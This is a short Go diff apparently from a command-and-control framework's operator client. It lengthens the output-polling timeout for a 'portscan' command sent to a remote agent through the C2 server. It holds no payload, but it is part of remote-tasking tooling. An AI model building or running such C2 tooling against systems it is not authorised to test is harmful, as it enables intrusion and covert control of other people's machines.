@@ -237,8 +237,15 @@ func Start(c2 string) {
 				break
 			}
 
-			cmdid := sendCommand(cmdString, agent, c2)
-			deadline := time.Now().Add(15 * time.Second)
+			var cmdid string
+			var deadline time.Time
+			if cmdString == "portscan" {
+				cmdid = sendCommand(cmdString, agent, c2)
+				deadline = time.Now().Add(120 * time.Second)
+			} else {
+				cmdid = sendCommand(cmdString, agent, c2)
+				deadline = time.Now().Add(15 * time.Second)
+			}
 			for {
 				id, output := getOutput(c2+"/api/cmd/output/"+agent+"/"+cmdid, c2, cmdid)
 				sDec, _ := base64.StdEncoding.DecodeString(output)
